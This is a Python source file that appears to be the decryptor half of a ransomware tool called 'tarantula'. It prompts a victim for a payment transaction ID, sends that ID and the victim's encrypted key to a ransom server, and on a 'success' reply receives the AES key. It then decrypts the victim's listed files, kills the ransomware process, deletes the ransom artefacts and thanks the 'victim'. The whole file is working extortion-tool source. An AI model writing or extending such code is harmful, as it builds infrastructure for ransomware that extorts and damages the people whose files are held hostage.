import os
import sys
import json
import requests
from colorama import init, Fore, Back
from libs.server import *
from libs.crypto import read_encrypted_key, read_file_list, aes_decrypt
from libs.process import *
init()

def get_progress_bar(current, max, bar_length=30):
    progress_char = '#'
    progress_bar_count = round(bar_length * current / max)
    progress = round(100 * current / max)
    full_progress = f'[{progress_char * progress_bar_count}{"-" * (bar_length - progress_bar_count)}] ({progress}% decrypted)'
    return full_progress

txId = input("Enter transaction ID: ")
print(f"{Fore.YELLOW}Wait. I'm checking if payment with transaction {txId} is valid...{Fore.RESET}\n")

request_data = {
    "transactionId": txId,
    "encryptedKey": read_encrypted_key()
}

response = requests.post(payment_check, data=json.dumps(request_data), headers={"Content-Type": "application/json"})
server_response = json.loads(response.text)
if (server_response['status'] == "success"):
    key = server_response['key']
    print(f"{Fore.GREEN}[+] Payment is valid! Decrypted key fetched!{Fore.RESET}")
    print(f"{Fore.BLUE}    - Key: {key}{Fore.RESET}")
    print("********************************")
    print(f"{Fore.YELLOW}[*] Decryption started{Fore.RESET}")
    files = read_file_list()
    all_files = len(files)
    for i in range(len(files)):
        _i = files[i]
        if (os.path.exists(_i) and os.path.isfile(_i)):
            try:
                file_content = open(_i, "rb").read()
                decrypted = aes_decrypt(file_content, key.encode())
                with open(_i, "wb") as f:
                    f.write(decrypted)
            except:
                continue
            print(f"{get_progress_bar(i, all_files, 30)}\r", end="")
    print(f"\n{Fore.GREEN}[+] Decryption finished!{Fore.RESET}")
    print("********************************")
    print(f"{Fore.YELLOW}[*] Deleting junk files...{Fore.RESET}")
    print("********************************")
    junks = ['encrypted-key.tarankey', 'file-list.taranfls', 'tarantula']
    kill_process("tarantula")
    for i in junks:
        try:
            os.remove(i)
        except:
            print(f"{Fore.RED}    [!] Error while deleting {i}{Fore.RESET}")
    print(f"{Fore.GREEN}[+] You are free now, thank you victim <3{Fore.RESET}")
else:
    server_message = server_response['message']
    print(f"{Fore.RED}[!] {server_message}{Fore.RESET}")
    sys.exit()